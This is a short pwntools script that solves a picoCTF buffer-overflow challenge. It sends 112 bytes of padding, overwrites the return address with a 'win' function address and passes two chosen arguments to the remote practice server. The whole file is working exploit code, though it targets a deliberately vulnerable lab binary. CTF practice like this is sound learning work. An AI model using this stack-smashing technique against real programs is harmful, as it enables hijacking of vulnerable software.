#! /usr/bin/env python

from pwn import *

# nc saturn.picoctf.net 54581
p = remote(host='saturn.picoctf.net', port=56553)

# payload: offset=112, arg1=0xCAFEFOOD, arg2=0XFOODFOOD
win_addr = p32(0x08049296)
offset = int(112)
arg1 = p32(0xCAFEF00D) 
arg2 = p32(0xF00DF00D)


payload = flat(
    'a'*offset, 
    win_addr,
    0xdeadbeef,
    arg1,
    arg2
)
# win_addr = overwrited address
# 0xdeadbeef -> return address 

success(payload)

p.sendlineafter(b'lease enter your string:', payload)
log.info(p.recvall())
